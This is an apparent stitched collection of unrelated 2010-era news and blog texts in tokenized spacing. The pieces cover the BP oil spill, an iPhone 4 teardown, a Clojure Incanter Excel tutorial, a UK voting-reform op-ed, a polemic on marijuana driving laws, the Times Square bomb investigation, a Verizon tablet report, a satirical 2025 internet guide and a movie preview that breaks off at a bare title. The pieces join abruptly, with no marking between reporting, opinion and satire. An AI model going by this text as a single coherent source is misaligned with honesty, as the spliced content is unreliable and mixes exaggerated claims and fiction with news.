The company 's next effort to plug the leak is to come at dawn Wednesday .
BP plans to pump thick , viscous fluid twice the density of water into the site of the leak to stop the flow so the well can then be sealed with cement -- the " top kill " procedure .
Hayward , noting that the attempt will be carried out on the seafloor a mile below the sea surface , estimated the odds of success for the method at 60 percent to 70 percent .
Asked about the company 's continued use of an oil dispersant in the face of an EPA request that it use a less toxic alternative , Hayward said , " Everything that we do with dispersants is with the explicit approval of the EPA . "
But EPA Administrator Lisa Jackson said she was not pleased with BP 's response to the government 's request .
" The answer we got back from BP , to me , seemed more like a defense of their current choice -- reminded me a little bit of that old commercial ' I 'd rather fight than switch , ' " she told reporters in Venice , Louisiana .
" We need to ask ourselves whether there 's not a better product out there . "
Federal officials told BP that " we expect to see a substantial reduction in the overall amount of dispersant used , " from 50,000 gallons or more per day to less than 15,000 gallons per day , she said .
That can be accomplished by releasing the dispersant below the surface of the water , she said .
She said tests showed that the dispersant , Corexit 9500 , was more toxic to baby shrimp and baby silverfish than were any of five other dispersants .
Coast Guard Commandant Adm . Thad Allen , the Obama administration 's point person in the Gulf , called the decision to use dispersants a tradeoff .
" It means we 're willing to accept the effect of the oil in the ocean rather than on land , " he said .
Hayward acknowledged that BP 's reputation has taken a beating , but said the company is being straightforward about its efforts .
" We 're trying to communicate openly and transparently about everything that we 've done , " he said .
As the environmental impact of the disaster was just beginning to unfold , he noted that BP will set aside a half billion dollars to open a research program to study the effects of the spill .
Hayward 's comments came a day after Interior Secretary Ken Salazar expressed frustration with the delay in stopping the spill , asserting that BP has " from day one , frankly , not fulfilled the mission it was supposed to fulfill . "
He said the company has missed " deadline after deadline " and that he was not confident that BP knew what it was doing .
" If we find that they 're [ BP ] not doing what they 're supposed to be doing , we 'll push them out of the way , " Salazar said .
BP Chief Operating Officer Doug Suttles acknowledged Monday that the federal government could take over the effort , but said the results would be no better .
" I do n't think anyone else could do better than we are , " he said .
If the " top kill " procedure does not work , he said , BP will try to fit a second , smaller containment dome over the ruptured pipe , Suttles said .
A first containment dome failed to stop the leak .
If the second dome does not work , he said , the company would " still have plenty of other options . "
The company could try a " junk shot , " which would involve plugging the well with rubber and other substances , BP Managing Director Robert Dudley said Sunday .
However , a permanent solution could take until August -- the estimated completion date for a relief well , said Allen .
By the time the runaway well is capped , the amount of oil discharged could be comparable to the total released in the Exxon Valdez environmental disaster 20 years ago , Allen said .
But he expressed no appetite for suggestions that the federal government should take over the project .
" You need to do very technical work at 5,000 feet , " he said , referring to the depth of the leak .
" You need equipment and expertise that 's not generally within the government -- federal government -- in terms of competency , capability or capacity . "
The administration vowed to persevere .
" We are going to be tireless in working to do everything we can to support the community and everybody whose livelihoods have been imperiled down in the region , " President Obama said at a reception celebrating Asian - American and Pacific - Islander Heritage Month .
U.S. Commerce Secretary Gary Locke on Monday declared a fishery disaster in the Gulf of Mexico because of the economic impact of the oil spill on fisheries in the region .
The National Oceanic and Atmospheric Administration has closed nearly 20 percent of the commercial and recreational fisheries in the area because of the spill , and Locke 's declaration will allow the federal government to put additional resources into the Gulf states to soften the blow .
Meanwhile , Department of Homeland Security Secretary Janet Napolitano and Salazar -- each on a fourth visit to the region since the April 20 spill began -- toured the spill area Monday accompanied by a phalanx of politicians .
" We are going to do everything we can to protect these lands , to protect these parishes , to make sure that claims are paid , " Napolitano told reporters in Galliano , Louisiana .

With an armada of more than 1,000 vessels and the efforts of more than 22,000 people who have put into place hundreds of thousands of feet of boom , the response to the oil spill is the largest in U.S. history , said Napolitano .
That did not satisfy Louisiana Gov. Bobby Jindal , who called Monday for more resources to be mobilized against the oil and reiterated his call for the Army Corps of Engineers to move quickly to approve a plan to protect threatened marshland by building sand booms .
" We 've got to take matters into our own hands if we are going to win this battle to protect our coast , " he said .
" Every day we are not dredging sand gives one more day for oil to enter the ecosystem . "
He bemoaned the fact that nearly 70 miles of Louisiana coast has been hit by oil .

" BP is the responsible party and we need the federal government to make sure they are held accountable , " he said .
" Our way of life depends on it . "
Coast Guard Rear Adm. Mary Landry , the federal on - scene coordinator for the response effort , told reporters the barrier island project was under review .
Environmental and wildlife officials " are weighing in on the impact to endangered and threatened species , and other impacts this large - scale project could have , " she said .
Since the explosion aboard the Deepwater Horizon in late April about 40 miles off Louisiana , oil has been gushing into the Gulf at an estimated rate of at least 5,000 barrels a day ( 210,000 gallons ) .
Some estimates are far higher .
Eleven workers are missing and presumed dead after the sinking .
The cause of the explosion has not been determined .

We stripped the iPhone 4 down to its basic components .
Apple definitely spent time giving the phone a thorough makeover , meticulously changing every little facet .
We are happy to splay the fruits of their labor for your enjoyment !
We have confirmed that the iPhone 's A4 processor has 512 MB RAM , unlike the iPad 's more limited 256 MB .
This decision may have been made fairly late in Apple 's development cycle , because early leaked prototype phones only had 256 MB .

I have just added David James Humphreys ’ incanter - excel module to the Incanter distribution , providing basic capabilities for reading Microsoft Excel spreadsheets in as Incanter datasets and saving datasets back out as xls files .
I have posted a simple spreadsheet of Australian airline passenger data from the 1950s to the Incanter website for the following example .
The read - xls function can read xls files given either a filename or URL , so you wo n’t need to download the file .
Start by loading the necessary libraries , including incanter .
excel .
( use '( incanter core charts excel ) )
Next , we can use the with - data macro to bind a dataset converted from the above xls file , using the read - xls function , and then view it .
( with - data ( read-xls " http://incanter.org/data/aus-airline-passengers.xls " ) ( view $ data )
The read - xls function takes an optional argument called : sheet that takes either the name or index of the worksheet from the xls file to read ( in this case either “ dataset ” or 0 ) , it defaults to 0 .
[ NOTE : A current weakness of read - xls is that cells containing formulae , as opposed to actual data , are not imported ( i.e. the cells remain empty ) . ]
Finally , we ’ll create a time - series plot of the data .
However , the time - series - plot needs time in milliseconds , so we ’ll first create a function that converts the date column from Java Date objects to milliseconds , and then view the plot .
( let [ to - millis ( fn [ dates ] ( map #(.getTime %) dates ) ) ] ( view ( time - series - plot ( to - millis ( $ : date ) ) ( $ : passengers ) ) ) ) )
Datasets can also be saved as Excel files using the save - xls function .
The following example just reads in one of the sample datasets using incanter .
datasets / get - dataset and then saves it as an xls file .
( save-xls ( get- dataset : cars ) " /tmp/cars.xls " )
The incanter - excel module is now included in the Incanter distribution on Github , and is available as a separate dependency from the Clojars repository .
The complete code from this example can be found here .
The first error is to think that the Alternative Vote ( called preferential voting in Australia ) would leave the Conservative Party in “ permanent opposition ” .
In Australia , conservatives have been in government for 65 of the 92 years since the Alternative Vote was introduced .
The Alternative Vote is no inherent hindrance to centre - right parties .
To suggest that Australia is more conservative than the UK would be silly .
In the medium and long - term the Conservatives would have nothing to fear from an Australian - style Alternative Vote , it is only the short - term that it could be an issue for the Tories , and more on that below .
The Alternative Vote system now championed by Gordon Brown has operated in Australia ’s lower house , the House of Representatives since 1918 , and the Single Transferable Vote system that Nick Clegg likes most has been operating in the Australia ’s upper house , the Senate , since 1949 .
In my view there are many misconceptions amongst Conservatives about what voting reform might mean if applied in the United Kingdom , particularly as it relates to the Conservative Party itself .
The significance of this is that these misconceptions may cost the Conservatives government .
With the Labour Party having suffered a massive swing against them , the only hope of Gordon Brown retaining government is to offer the Liberal Democrats major electoral reform .
Nick Clegg will be very tempted to grasp this rare opportunity .
For the Conservatives this possibility should focus their minds on whether voting reforms should be countenanced as part of a negotiated deal in order to form government .
The second error made by some Tories is to claim that the Alternative Vote is less stable than First Past the Post , but again , since it was introduced in Australia in 1918 there have been fewer changes of government than in the United Kingdom - 9 versus 12 .
The Alternative Vote in Australia tends to lead to quite stable two party politics as preferences drift up to consolidate the major two parties .
This benefit to the two major parties is no doubt why Gordon Brown suggested the Australian system as his preferred option recently .
The Australian Alternative Vote system maintains the constituency link , with one Member per constituency .
Australia 's House of Representatives has always been overwhelmingly composed of the two major Parties .
Conservatives in Australia are strongly supportive of the Alternative Vote because the system produces a more efficient reflection of the popular will , and this builds public trust in governance .
Australia has also had Nick Clegg 's preferred option of Single Transferable Vote operating in our Senate for many years , and when you see the greater representation of small parties in our Senate you can see why the Liberal Democrats have been attracted to this idea .
This radical option is the most complex system and would lead to less accountable and less stable government if introduced in the lower house .
Now that the electorate has delivered its verdict , Gordon Brown will be desperate to offer anything to stay in power , even including the Liberal - Democrats most - favoured radical option of Single Transferable Vote .
For the Conservative Party confronted with this scenario , it may be in their interests to consider the more moderate Australian Alternative Vote system in preference to the more radical options .
The key concern for Tories moving to such a system would be the short - term effects , but in my view these can easily be overstated .
If Alternative Voting were introduced in Britain my guess is that opinion polls would translate immediately into a lift for the left as Lib - Dems and Labour preferences flowed mostly to each other .
But this static analysis , which is accepted by pessimistic Tories , neglects the dynamic feedback that results from such polls .
To illustrate the fallacy of static analysis , let ’s say for example , that Alternative Voting had been suddenly legislated in the lead - up to the election .
Opinion polls would have shown Labour set to return , with Gordon to Win headlines everywhere .
The electorate would have instantly adjusted its voting intentions to account for the fact that this was manifestly not their desired outcome .
If an Alternative Vote were introduced in Britain my view is that the polling feedback effect would very quickly stabilise the situation into a normal two party contest in which the Tories battled with a major centre - left party within a band of around 40 - 60 per cent two - party preferred support ( Just as has been the case in Australia for as long as polling has been done ) .
A lot of the misguided commentary on the Alternative Vote seems to derive from the observation of particular voting systems in Europe , but this is akin to condemning all modern music as awful having only ever listened to a Eurovision song contest .
Of course , it may be that even correcting for these misconceptions about voting systems that the Conservative Party takes the view that an Alternative Vote is not a price worth paying .
But the important point is that any consideration of the issue should not be based on a misunderstanding of the options .

Did you smoke pot last month and drive a car this morning ?
Obama wants to arrest and incarcerate you .
If you smoked marijuana last week or even last month and you drive a car , you may be sent to prison under new guidelines drafted by the federal government .
The Obama administration released its National Drug Control Strategy guidelines last week .
The federal government wants all of the states to adopt its authoritarian and draconian diktat and expand the drug war .
From the guidelines :
Encourage States To Adopt Per Se Drug Impairment Laws [ ONDCP ] .
State laws regarding impaired driving are varied , but most State codes do not contain a separate offense for driving under the influence of drugs ( DUID ) .
Therefore , few drivers are identified , prosecuted , or convicted for DUID .
Law enforcement personnel usually cite individuals with the easier to prove driving while intoxicated ( DWI ) alcohol charges .
Unclear laws provide vague signals both to drivers and to law enforcement , thereby minimizing the possible preventive benefit of DUID statutes .
Fifteen states have passed laws clarifying that the presence of any illegal drug in a driver ’s body is per se evidence of impaired driving .
ONDCP will work to expand the use of this standard to other states and explore other ways to increase the enforcement of existing DUID laws .
A d v e r t i s e m e n t

Cannabis metabolites can remain detectable in the urine for up to 100 days or longer for a regular cannabis consumer and up to fifteen days for the casual consumer , according to NORML , the marijuana advocacy organization .
In other words , even if a pot smoker is conscientious and does not drive while intoxicated , that person can be arrested and convicted for DUID days or weeks after consuming marijuana .
It would not matter if you are sober as a teetotaler — if THC molecules are detected with a urine or blood test , you are probably going to prison .
You can kiss the right to vote and own a firearm sayonara .
In 2007 there were 14.5 million current users of marijuana in the United States , compared with 14.6 million in 2002 , while the number of Americans who have used marijuana increased .
The following states enforce “ zero tolerance ” draconian DUID laws :
Arizona : Zero tolerance for cannabis metabolites , mandatory 24 hours jail , up to 6 months upon conviction .
Delaware : Zero tolerance for cannabis metabolites .
Georgia : Zero tolerance for cannabis metabolites , mandatory 24 hours jail , up to 12 months upon conviction .
Illinois : Zero tolerance for cannabis metabolites , up to 12 moths upon conviction .
Indiana : Zero tolerance for cannabis metabolites , up to 60 days upon conviction .
Michigan : Zero tolerance for cannabis metabolites , up to 93 days upon conviction , vehicle immobilization for up to 180 days .
Nevada : 15 ng/ml for cannabis metabolites .
Ohio : 15 ng /ml for cannabis metabolites , mandatory 72 hours in jail , up to 6 months upon conviction , 6 month to 3 year license suspension .
Pennsylvania : DUID for cannabis metabolites , amount unclear .
South Dakota : Zero tolerance for cannabis metabolites for persons under the age of 21 .
Utah : Zero tolerance for cannabis metabolites , mandatory 48 hours jail , up to 6 months upon conviction .
Obama ’s new guidelines will criminalize and add to the system hundreds of thousands of people and add thousands of people to the prison industry slave labor complex .
In 2007 an American was arrested on marijuana charges every 36 seconds .
Obama will increase this criminalization rate significantly .
DUI checkpoints are on the rise around the country .
In California , for instance , the state increased grants in 2009 by 47 % for DUI checkpoints , including “ roving ” DUI patrols .
2010 was predicted to be “ the year of the Checkpoint ” in California .
In California and elsewhere , these unconstitutional checkpoints are a highly profitable business for the state , netting billions of dollars every year .
Behavioral impairment is not the issue .
Expanding the criminal class is the issue .
Government will never rest until it categorizes most of us as criminals .

New York ( CNN ) -- Faisal Shahzad made a practice run in Manhattan the day before he allegedly tried to blow up a car bomb in Times Square , according to a law enforcement source with knowledge of his questioning .
Last Friday , Shahzad drove his white Isuzu from Connecticut through Times Square , where he staked out potential locations for the following night 's planned attack , the source said .
He then parked the Isuzu several blocks away from Times Square , though the precise location was unclear , and took a train back to Connecticut , the source said .
On Saturday night , with his recently acquired Nissan Pathfinder loaded with his makeshift explosives , Shahzad drove southbound along Manhattan 's East River on FDR Drive to the 49th Street exit , the source said .
Shahzad then pulled over and reached into the Pathfinder 's rear compartment where he attempted to set into motion the process needed to set off the homemade bomb , the source said .
The source , who did not explain how Shahzad had attempted to set off the bomb , said he then took a number of turns and wound up entering Times Square by driving south down Seventh Avenue .
The source said Shahzad told investigators he turned right onto 45th Street toward Eighth Avenue because he saw a place to pull over .
It 's unclear why Shahzad left the Pathfinder 's engine running and hazard lights blinking .
But because of an incredible goof , Shahzad could n't use his escape car .
He had accidentally left the keys to that vehicle in the Pathfinder that he thought was about to blow up , the source said .
He apparently went to a train station , where he boarded a Metro North train back to Connecticut .
Another law enforcement source said investigators found a train receipt used by Shahzad that is stamped about 7 p.m. , a half hour after a witness notified authorities that the car in Times Square was filing with smoke .
Sources say investigators believe he ran to catch the train that pulled out around 7 or 7:15 Saturday night .
The source added that police investigators have discovered a surveillance video of Shahzad walking in Shubert Alley -- which runs between 44th and 45th Streets just west of Broadway -- moments after witnesses saw the smoky SUV .
In the video he is wearing a white baseball cap .
Efforts also continued Wednesday to determine what may have motivated Shahzad .
An official familiar with the investigation said Wednesday that Shahzad felt Islam was under attack .
Any grudge Shahzad may have held against the United States appears to have developed recently , according to a senior U.S. official who is familiar with the investigation but not authorized to speak publicly .
The investigation has found nothing to indicate that Shahzad had any long - standing grudge or anger toward the United States , the official said .
" What we know is , the dynamic appeared to have changed in the last year , " the official said .
Investigators have not determined whether Shahzad had any training from Pakistani groups in anything , the source said .
Additionally , the official suggested , detentions in Pakistan have been carried out to collect information and not because officials had reached any conclusions about their guilt or ties to any groups .
" They are reaching out to people , bringing them in and doing their due diligence , but ' arrest ' suggests a strong connection to the guy .
While anything is possible , they have n't arrived at any conclusion , " the source said .
Authorities in Pakistan have rounded up a number of people for questioning , as U.S. law enforcement sought Wednesday to piece together the actions and motivations of Shahzad .
Iftikhar Mian , the father - in - law of Shahzad , and Tauseef Ahmed , Shahzad 's friend , were picked up in Karachi , Pakistan , on Tuesday , two intelligence officials said .
An intelligence source said Wednesday that Muhammed Rehan , an associate of Shahzad , also was detained on Tuesday .
Rehan allegedly was instrumental in making possible a meeting between Shahzad and at least one senior Taliban official , a senior Pakistani official said Wednesday .
The official said that Rehan drove Shahzad on July 7 in a pickup truck to Peshawar , Pakistan .
At some point , they headed to the Waziristan region , where they met with one or more senior Taliban leaders , the official said .
Rehan is believed to have links to the militant group Jaish - e - Mohammed , which is close to al Qaeda and the Pakistani Taliban , the official said .
Several officials in Karachi said Rehan was picked up in Karachi's North Nazimabad district .
They said others were taken into custody for questioning on Wednesday , but could not say how many , who they were or where they were seized .
A senior U.S. official said investigators were looking into possible links between Shahzad and Pakistani groups and had found none , " but that does n't say there is no connection . "
The official added that there was nothing to indicate Shahzad is from an extremist family .
Asked whether Shahzad was a " wannabe " who may be inflating his contacts , the source said , " It is going to take a little more time for the investigation to gel . "
Investigators have uncovered no evidence that Shahzad had U.S. - based associates related to the plot , a federal law enforcement official said Wednesday .
Investigators believe he handled the logistics himself , from purchasing the car to buying the materials for the bomb , the official said .
Investigators are looking for any associates who may be overseas , the official said .
The federal law enforcement official said Wednesday that Shahzad was still cooperating with the FBI and had waived his right to a lawyer .
The official did not provide details about what Shahzad has been saying .
The official acknowledged that the FBI lost contact with Shahzad while conducting surveillance of him prior to tracking him down aboard a plane set to take off from New York 's John F. Kennedy International Airport , but the official did not say for how long .
The official said agents had not wanted to tip off Shahzad that he was under surveillance , that the situation involved multiple locations and that Shahzad was aware of news reports that a suspect had been identified .
" There were a lot of traps out there to catch him if he did flee and , in the end , it worked , " said the official .
Shahzad , a 30 - year - old naturalized U.S. citizen from Pakistan , was arrested late Monday at JFK airport after boarding a flight bound for Dubai , United Arab Emirates .
His final destination was to have been in Pakistan .
When authorities did track him down , Shahzad apparently was unsurprised .
" Are you NYPD or FBI ? " he asked .
A Customs and Border Protection agent exposed his badge and said , " CBP , " an administration official said .
In Washington , State Department spokesman P.J. Crowley told reporters that " the Pakistanis are fully cooperating in the investigation .
They recognize , as we do , that this is a shared responsibility and a shared threat . "
The charges paint him as a terrorist who received explosives training in Pakistan 's volatile Waziristan region , where government forces have been working to root out Taliban militants .
The Pakistani Taliban , a major militant group in the region , praised Shahzad but denied any link to him .
Read complaint filed in federal court Tuesday ( PDF )
Shahzad has been charged with attempting to use a weapon of mass destruction , acts of terrorism transcending national boundaries , and three other counts in connection with the incident .
If convicted , he faces up to life in prison .
Shahzad admitted he drove a Nissan Pathfinder into Times Square on Saturday night and attempted to detonate the vehicle , which was packed with gasoline , propane tanks , fireworks and nonexplosive fertilizer , according to a complaint filed Tuesday in U.S. District Court in New York .
Court documents said that , after receiving bomb - making training in Pakistan , Shahzad returned to the United States via a one - way plane ticket February 3 .
Upon his return , Shahzad qualified for secondary , or more detailed , screening under Customs and Border Protection criteria and was interviewed , the administration official said .
He told immigration officials that he had been visiting his parents in Pakistan for the previous five months , according to the documents .
He also told officials that his wife remained in Pakistan .
CBP , following protocol , sent a report to the FBI and other intelligence agencies that included Shahzad 's passenger information , the official said .
Included in that report were phone numbers associated with his travel , when he bought his ticket , and when he filed a customs form , the official said .
Last weekend , as they investigated the failed bombing attempt , FBI agents turned up a telephone number but no name in connection with Shahzad 's purchase of a Nissan Pathfinder .
When agents searched databases containing the numbers called by or to that phone , they found the number on the CBP report , the official said .
That is how they came up with Faisal Shahzad 's name .
The court documents show that Shahzad apparently maintained contact with people in Pakistan after returning to the United States .
He received 12 phone calls from his country of birth in the days leading up to the incident -- five on the day he bought the Nissan Pathfinder used in the attempted attack .
Those calls ceased three days before the failed bombing , the documents show .
Authorities began focusing on Shahzad after tracing the sale of the Pathfinder to him .
Shahzad has a Karachi identification card , a sign of Pakistani residency , according to Pakistani Interior Minister Rehman Malik .
Shahzad 's father , Bahar Ul Haq , is a retired senior officer in the Pakistani Air Force .
The former air vice marshal lives in the Peshawar suburb of Hayatabad , according to Kafayat Ali , whose father is a first cousin of Shazad 's father .
Shahzad lived at his father 's house in Hayatabad when his father was posted in Peshawar , Ali said .
Shahzad , his elder brother Amir and their two sisters moved with the father and received their education in the cities where the father was assigned .
Ali said Shahzad 's hometown is Mohib Banda , a village about 78 miles ( 124 kilometers ) northwest of Islamabad , Pakistan .
Ul Haq has farmland in Mohib Banda , and Shahzad and his siblings visited there during vacations and to attend relatives ' weddings .
Ali said Amir is a mechanical engineer living in Canada , where he is married and lives with his family .
Both sisters are married ; one is a doctor and the other is a housewife .

OCEAN SPRINGS , Miss . ---
Globs of gooey oil began washing ashore the Mississippi mainland for the first time Sunday morning , coating the shoreline near the Lake Mars landing in Gulf Park Estates .
Officials with state departments of marine resources and environmental quality closed the surrounding fishing waters and ordered numerous fishermen away from the area .
Booms that were open to allow boat traffic at East Beach and Front beach were closed in anticipation of the oil continuing its movement to the north .
The next high tide is scheduled for today at 11:30 a.m .

Verizon CEO
Lowell McAdam says that his company is working closely with Google on a tablet computer .
The tablet will be based on the Android operating system .
While neither Verizon or Google would confirm the hardware partner , McAdam mentioned Google in an interview with the Wall Street Journal .
" We 're working on tablets together , for example , " he said .
" We 're looking at all the things Google has in its archives that we could put on a tablet to make it a great experience . "
By " archives " , we guess that McAdam means Google 's rather long list of products and services .
Between Google 's books , map , email , chat , latitude and other products , it would be pretty easy to stock a tablet with all that it needs initially .
McAdam hinted that the Verizon tablet would come about in a similar way to the Droid phone , with Google 's OS , third - party hardware and Verizon 's data network .
Do n't expect it too soon , either .
Admitting that Verizon has been " handicapped " by its CDMA network , McAdam said new devices would be available to run on the company 's new LTE 4G network early next year .
Another tidbit from the interview :
It looks like Verizon will be shutting down unlimited , per - device data plans in favor of a " bucket of megabytes . "
These data - capped plans would be shared between devices – a tablet , a cellphone and an e-reader , for example .
This is exciting stuff .
It looks like Apple will be facing stiffer competition in the tablet market than it ever did in the iPod market .
With Android tablets now confirmed , and an HP / Palm tablet all but certain , hopefully consumers will see the benefit of all - out tablet war .

How to Access the Internet ( A Guide from 2025 )
Welcome to the Internet !
By following the simple rules below , you make sure your internet experience is smooth and risk free .
RealIdentity
Before signing on , please ensure you have received your RealIdentity card from local authorities .
Signing on to the internet without identifying yourself has been ruled illegal in the Stop Anonymity Act of 2012 , and you need to be sure to associate your comments , emails , posts and more with your real name .
Setting up your RealIdentity is easy , as your computer ( MacOS 15 or ChromeOS7 and higher ) will automatically connect to your near - by card , verifying it with your biometric data .
Do not put on shades , veils , contact lenses , and please shave before the biometric scan starts ; it is advised to not perform biometric authentication after a long night of drinking .
Geolocation
The internet is split into roughly 120 country regions .
This is to ensure that fitting entertaining content will be streamed to you , and that you will not find content that may be unsettling .
Your Geolocation should be automatically derived from the position of your point of login – if it matches with the country provided in your RealIdentity card , you ’re ready to go .
Users from the US may enjoy great copyrighted US TV show reruns like Friends 2020 , for instance , while users in other countries may have different tastes and preferences .
As a note for travellers :
Before planning your trip to another country , make sure you apply for a Geolocation Visa in order to surf from internet cafes within that country .
Alternatively , you can also jump into your cybersuit and just enjoy the other country through Google Street View 3D Plus Touch .
Google Street View 3D
Plus
Touch will only show you those things from the other country which are legal in your location , so it ’s a great , risk - free and streamlined experience to get to know other exciting cultures .
Signing Up for the Right Internet
Many content offerings depend on the internet you ’ve signed up to .
If you ’ve signed up with the GoogleAppleAmazon Internet , then you have one - click access to a great digital library , many movies , as well as a certain approved set of homemade web pages .
If you ’ve signed up with the DisneyWarnerBrosViacom internet , you get a different digital library , set of movies , and approved homemade web pages .
While we cannot specifically recommend one internet over the other , the goo :// internet is great for research and mindless entertainment ( talking dogs ) , whereas dis :// has the faster movie experience .
Buffering the 50 Terabyte Feel3D movie Wall - E Jr. Returns for smooth playback and touch takes only 0.1 seconds .
Adult Content
If your RealIdentity identifies you as being over 21 years of age ( 30 in some countries ) , you are of the legal age to view adult content .
Adult content includes pornography , unmoderated forum discussions , as well as political discourse , religious counter - views , artistic expression , and free speech in general .
If you are below 21 years ( 30 in some countries ) , you can still discuss politics and religion with your family , and you are free to artistic expression in your own house ( local terms and conditions apply ) .
Acquiring Your Internet Surfing License
Getting your Internet Surfing License is a necessary prerequisite in making the web safe for everyone .
Before governments made the ISL mandatory , people often found themselves lost in the myriad of web sites , naively double - clicking Hit The Monkey to Win iPad ads , finding themselves spammed by pop-unders .
Acquiring the license typically takes only between 2 - 5 days of education by your local Surf Training School .
You will need to carefully prepare for the final test , in which you are required to answer simple questions like :
What is a pyramid scheme , and do they really work ?
How do I replace the solar cells on my cyber glove ?
Why exactly is it bad for people to badmouth their governments or big companies online ?
Why is it illegal to surf without a RealIdentity card ?
In which year did Google buy the internet ?
Product Placement
As you may know , product placement and paid product mentions in videos and text replaced all other forms of advertisement .
Keep in mind – without such product placement , the internet as we know it could not be paid for , and would not exist !
All major content providers agreed to switch to product placement instead of separated forms of advertisement in 2014 , and since 2019 , your government ’s politicians in over 80 countries are on board too , peppering their political speeches with commercial references .
This allows you to pay less taxes , so it ’s a win -win situation .
Technical Jargon
Sometimes you will run across abbreviations specific to the internet .
If you ’re not used to this tech speak , keep this glossary within reach or load it into your brain extension module .
Some key words are :
WWW - Literally “ World Wide Web ” , an expression used in the beginnings of the web .
It has since grown out of use but is still heard by certain older netizens .
Like communism , it was an appealing yet completely unrealistic idea .
Virus -
A virus , often called “ computer virus ” by oldtimers , is a program entering through your brain chip and meant to stimulate your commercial desires .
If you find yourself in the supermarket with the sudden urge to buy enormous amounts of a certain brand of cereals , it might be due to such a “ computer virus . ”
These programs are clearly illegal ; stimulating commercial desires via brain chips is required to be opt-in , and has a minimum legal age of 6 .
LOL -
The word by word meaning of this abbreviation has been lost in history – you may remember that the 2015 CleanUpTheNet
Act accidentally deleted quite a bit of archive material – though it is generally interpreted as a form of laughter ( it has also replaced Bless You as a reply to when someone sneezes ) .
Earning Money on the Internet
There are many ways to earn money on the internet .
Here is just a brief overview of some of the legal activities that can earn you a dollar or two :
If you can get a job as a BrainWorker , you will answer simple semi-automated questions like “ Is the person depicted in the photo male or female " for 8 hours a day .
Answering questions like these will help you power the algorithms of datacrunching companies like Google .
If you ’re lucky to score the high - paid job of an Idea Placer , you will be entering the parts of the internet where you can add comments or enter chats , influencing others by mentioning how great a product , idea or person is .
The US government alone employs around 150,000 Idea Placers around the web .
Work as a Content Rewriter .
Every day , new non-localized articles , images , news bits and user comments are entering the internet .
Before they can be successfully deployed to the localized versions of the net , they need to be rewritten to meet local cultural and legal requirements .
As a Content Rewriter , it is your job to know these requirements and change content accordingly , removing the unsettling parts or rewording those facts and bits which may cause cognitive dissonance with consumers .
Finding a Partner
Are you single and looking for the right partner ?
Based on your biometric data , your income , your location , as well as the Overall Attitude ( OA ) results from your Internet Surfing License , anywhere from 10 - 100 people in your area will be suggested to you .
At first , meeting all of them may seem a tedious way to find your true love – who has the time to get to know 10 people if it cannot be assured they are definitely Mr. , Mrs. or Rbt. Right ?
– but keep in mind : your grandmother ’s generation had none of these tools available , and they still managed to fall in love .
Stumbling Upon Illegal Content
As safe as the internet is today , there may still be a time when you stumble upon content that you may deem unnecessarily unsettling .
Perhaps a report of political issues in a foreign nation is shocking to you ; perhaps there ’s a bit of accidental nudity which slipped through ; perhaps you ’ve downloaded a version of a book from 1990 before a Content Rewriter had a chance to change it .
Make sure you report these pages to your local internet authorities by using your OS ’s Flag button .
A team of internet professionals may get back to you with further inquiries if necessary , and also meet you at your home to take a look at your current internet surfing hardware setup and general mental stability .
It ’s Easier Than It Seems
With so much information that seems to be necessary to take your first online steps , we do n’t want you to be frightened to enter the internet .
The web is a relaxing , streamlined and harmonious experience .
Decades ago , when the web was invented , it was a place of free roaming chaos .
Differing viewpoints , an abundance of copyright infringements , non-localized content , anonymous smear campaigns , unapproved software and more roamed the WWW .
Compared to then , we ’re truly lucky to be accessing the internet in 2025 , not 1995 .
Welcome to the net , and enjoy your stay !

Every summer , studio blockbusters vie for moviegoers ’ attention with shiny , gold - plated sequels , remakes , and comic - book adaptations , but there ’s always one movie that stands out as something everyone wants to see .
Baseketball .
The Love Letter . Lords Of Dogtown .
Nacho Libre . License To Wed . My Sister ’s Keeper .
This year , all eyes are on one movie : The Queen Latifah / Common NBA - themed romance Just Wright .
But since Just Wright comes out in mid-May , the next - best option is Marmaduke , the live - action adaptation of Brad Anderson ’s long - tolerated comic strip about a Great Dane who exhibits non-doglike characteristics .
Sometimes we do n’t understand it — and for that , we turn to Joe Mathlete ’s essential feature Marmaduke Explained — but the strip has been running in newspapers for almost 60 years , so it must be hilarious , right ?
That does n’t mean it does n’t need a fresh coat of paint , however .
Based on the trailer , the film adaptation looks like it recasts Marmaduke as a transplanted “ teenage ” dog trying to fit into his new home in Southern California , finding romance as he struggles against bullying “ pedigrees . ”
( But , you ’re asking , are n’t Great Dane ’s pedigreed ?
Stop thinking so hard . )
Alas , not all blockbusters can be Marmaduke .
So here ’s The A.V.
Club ’s helpful guide to the movies coming out in the dog days of summer 2010 , and how to distinguish them from Marmaduke .

Just Wright
What it ’s about : Queen Latifah stars as a physical therapist , diehard New Jersey Nets basketball fan , and all - around great person who ca n’t find love .
Common plays the Nets ’ superstar point guard , another all - around great person who suffers a terrible knee injury and hires Latifah for private rehabilitation sessions .
Will she rehabilitate his heart ?
How it ’s different than Marmaduke : Marmaduke can do a lot of things other dogs can’t : dance , drive a car , order things off the Internet .
But he is n’t Air Bud .
He ca n’t play basketball .
What a ridiculous notion .
How dare you even think it ?

Chances it ’ll be better than Marmaduke : 100 percent .
Latifah and Common are sweet and likeable to a fault .
And which is better , a bland , paint - by - numbers romance between sympathetic adults , or the butt - sniffing courtship of a Great Dane and a collie voiced by Fergie ?
The choice is clear .

Letters To Juliet
What it ’s about : Amanda Seyfried stars as the neglected fiancée of a New York chef .
While vacationing in Verona , she joins a group of women dedicated to answering letters written to William Shakespeare ’s Juliet .
Will romance follow ?
( Spoiler : Yes . )
How does it differ from Marmaduke ?
Though the Marmaduke strip easily lends itself to Shakespearean themes — that dog is downright Falstaffian in his enthusiasm for life !
— he ’s still a dog .
When you get down to it , he ’s more likely to show affection by mounting his lover ’s hindquarters than writing her a letter .

Chance it ’ll be better than Marmaduke : 50 percent .
Letters To Juliet features the always - reliable Vanessa Redgrave and postcard - perfect Italian scenery .
Marmaduke has a big funny dog .
It ’s a toss - up .

Robin Hood
What it ’s about : Making people forget about the Kevin Costner Robin Hood .
Instead , director Ridley Scott and star Russell Crowe are apparently hoping potential viewers will associate Robin Hood with Gladiator ( and to lesser extents , Braveheart and The Lord Of The Rings ) , all of which it strongly resembles , as Crowe - as - Robin leads a grim forest uprising against the evil Prince John .
How does it differ from Marmaduke ?
Marmaduke ’s ongoing wacky destruction of his owners ’ home is presumably just doggy high - spirited fun , and not part of a guerilla campaign to bring down a corrupt , oppressive regime .
Maybe .
Advertisement
Chance it ’ll be better than Marmaduke : 100 percent .
While Robin Hood is likely to be an overblown echo chamber of a movie that warps the too - familiar Robin Hood legend into a different too - familiar “ charismatic leader foments uprising ” pattern , it still wo n’t feature sassy purse - dogs .

MacGruber
